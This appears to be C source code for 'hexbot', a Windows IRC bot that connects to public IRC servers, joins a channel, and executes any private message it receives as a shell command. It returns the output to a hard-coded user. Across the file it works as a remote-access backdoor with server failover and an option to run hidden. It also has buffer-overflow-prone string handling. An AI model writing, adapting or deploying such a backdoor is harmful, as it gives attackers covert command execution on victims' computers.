/*[ hexbot IRC bot ][2013]
*
*	Written by Bashlykov Sergey aka hexfox
*
*   hexbot - Remote control of a Windows computer via IRC.
*   The IRC bot connects to the IRC server and enters
*   the channel. When another user sends a private message
*   to the bot, this message as a command is executed
*   on the remote computer where the bot started.
*
*/

#pragma comment(lib,"ws2_32.lib")
#include <winsock2.h>
#include <stdio.h>
#include <conio.h>
#include <string.h>
#include <time.h>
#define popen _popen
#define pclose _pclose

static SOCKET Socket;
int createSock( char * serverHost, unsigned short serverPort )
{
    WSADATA wsaDat;
    struct hostent *host;
    struct sockaddr_in sockAddr;

    // Initialise Winsock
    if ( WSAStartup( MAKEWORD(2, 2), &wsaDat ) != 0 )
    {
        printf( "WSA Initialization failed!\r\n" );
        WSACleanup();
        return 0;
    }

    Socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );

    if ( Socket == INVALID_SOCKET )
    {
        printf( "Socket creation failed.\r\n" );
        WSACleanup();
        return 0;
    }

    // Resolve IP address for hostname

    if ( ( host = gethostbyname( serverHost ) ) == NULL )
    {
        printf( "Failed to resolve hostname.\r\n" );
        WSACleanup();
        return 0;
    }

    // Setup our socket address structure

    sockAddr.sin_port = htons( serverPort );
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_addr.s_addr = *( (unsigned long*)host->h_addr );

    // Attempt to connect to server
    if ( connect(Socket, (struct sockaddr*)(&sockAddr), sizeof(sockAddr)) != 0 )
    {
        printf( "Failed to establish connection with server\r\n" );
        WSACleanup();
        return 0;
    }
    return 1;
}


void deleteSocket()
{
    shutdown(Socket, SD_SEND);	// Shutdown our socket
    closesocket(Socket);	// Close our socket entirely
    WSACleanup();	// Cleanup Winsock
}

 /*
//For invisible use "WINAPI WinMain"
int WINAPI WinMain(
                    HINSTANCE hInstance,	// handle to current instance
                    HINSTANCE hPrevInstance,	// handle to previous instance
                    LPSTR lpCmdLine,	// pointer to command line
                    int nCmdShow 	// show state of window
                  )
*/
int main()
{
    //MUST BE MANY SERVERS IF ONE NOT AVIALABLE
    char *goHost[] = { "chat.freenode.net", "irc.757.org", "irc.eth-0.nl" },
            sPort[] = "6667",
            sendPart[] = "PART #h3xb0t\n",
            sendQuit[] = "QUIT :bye\n",
            prefName[] = "zname",
            prefNick[] = "znick",
            joinChan[] = "JOIN #h3xb0t\n",
            pPong[] = "PONG ",
            sendHello[] = "hexbot",
            *msgNickName,
            *subGetBuf,
            *sendPing, // send ping to server
            *pCmd,
            getBuffer[10000], // display msg from server
            sendBuffer[80], // send msg to server
            tmpBuffer[80],
            usnd[60], srvcmd[10], snick[20], // vars for parser msg from server
            s1[10], name[20], s3[10], s4[10], s5[10], s6[10], nick[20];

    int lenGetBuf; 	// length buffer from server

    unsigned int i = 0,
                     stopped = 0,
                     countHost = sizeof ( goHost ) / sizeof ( goHost[0] ) ;

    struct _iobuf *pPipe;

    unsigned int lenPong = strlen ( pPong );

    memset(tmpBuffer, 0, sizeof(tmpBuffer));
    memset(getBuffer, 0, sizeof(getBuffer));

    while ( 1 )
    {
        if ( i == (countHost - 1) ) i = 0;
        // RECONNECT TO OTHER SERVER
        if ( !createSock( goHost[ i ], (unsigned short)atoi(sPort) ) )
        {
            printf( "Change server\n" );
            deleteSocket();
            i++;
            continue;
        }
        printf( "Connected...\n" );

        // SEND USER AND NICK TO SERVER
        msgNickName = ( char * ) malloc ( strlen(prefName) + strlen(prefNick) + 128 );
        srand ( (unsigned int)time(0) );
        sprintf( msgNickName, "USER %s%d 0 * :%s\nNICK %s%d\n", prefName, rand(), sendHello, prefNick, rand() );

        sscanf( msgNickName, "%s%s%s%s%s%s%s",  s1, name, s3, s4, s5, s6, nick);

        send( Socket, msgNickName, (int)strlen(msgNickName), 0 );

        printf( "%s", msgNickName );
        free ( msgNickName );

        while ( (lenGetBuf = recv( Socket, getBuffer, sizeof(getBuffer), 0 )) != SOCKET_ERROR )
        {
            sscanf( getBuffer, "%s%s%s", usnd, srvcmd, snick ); // parse for < userfrom@ip servercmd userto : >

            // JOIN TO CHANNEL
            if ( strstr( getBuffer, "/MOTD" ) || strstr( getBuffer, "MODE" ) )
            {
                send( Socket, joinChan, (int)strlen(joinChan), 0);
                printf( "%s", joinChan );
            }
            //FOR RECONNECT
            if ( strstr ( getBuffer, "ERROR :Closing Link" ) )
            {
                i++;
                break;
            }
            // FOR STAY ON A SERVER WE PLAY THE GAME PING PONG WITH SERVER  ))
            if ( !strncmp ( "PING", getBuffer, 4 ) )
            {
                printf( "%s", getBuffer );
                sendPing = ( char * ) malloc ( strlen(getBuffer) + lenPong );
                subGetBuf = strchr ( getBuffer,  ':');
                sprintf( sendPing, "%s%s", pPong, subGetBuf);
                printf("%s", sendPing);
                send( Socket, sendPing, (int)strlen(sendPing), 0);
                free ( sendPing );
            }
            // IF PARSING SERVERCMD AND NICKS EQUALLY
            else if ( !strcmp(srvcmd, "PRIVMSG") && !strcmp(snick, nick) )
            {
                /****
                    READ DATA AFTER SECOND CHAR ':'
                    FULL STRING =>
                    [ userfrom@ip servercmd userto : {COMMAND PARAM ...} (THIS SUBSRTRING IS WRITE TO VAR - pCmd) ]
                ****/
                pCmd = (char *) malloc( strlen(getBuffer) );
                pCmd = getBuffer;

                while ( pCmd[1] != ':' )
                {
                    pCmd++;
                }
                pCmd+=2;

                if ( strstr( pCmd, "!change" ) )  // change server
                {
                    i++;
                    send(Socket, sendPart, (int)strlen(sendPart), 0);
                    send(Socket, sendQuit, (int)strlen(sendQuit), 0);
                    break;
                }

                if ( strstr( pCmd, "!stop" ) )  // stop bot
                {
                    stopped = 1;
                    break;
                }

                pPipe = popen( pCmd, "rt" );

                printf( "%s", pCmd );

                // SEND RESULT OF COMMAND
                while( fgets( tmpBuffer, sizeof(tmpBuffer), pPipe ) )
                {
                    strcpy(sendBuffer, "PRIVMSG hexfox :");
                    strcat(sendBuffer, tmpBuffer);
                    send(Socket, sendBuffer, (int)strlen(sendBuffer), 0);
                }

                memset(sendBuffer, 0, sizeof(sendBuffer));
                memset(tmpBuffer, 0, sizeof(tmpBuffer));
            }
            else
            {
                printf( "%s", getBuffer );
            }

            lenGetBuf = 0;
            memset( getBuffer, 0, sizeof(getBuffer) );
        }

        if ( stopped )
        {
            send(Socket, sendPart, (int)strlen(sendPart), 0);
            send(Socket, sendQuit, (int)strlen(sendQuit), 0);
            deleteSocket();
            printf("hexbot is stopped!\n");
            break;
        }
    }

    return 0;
}
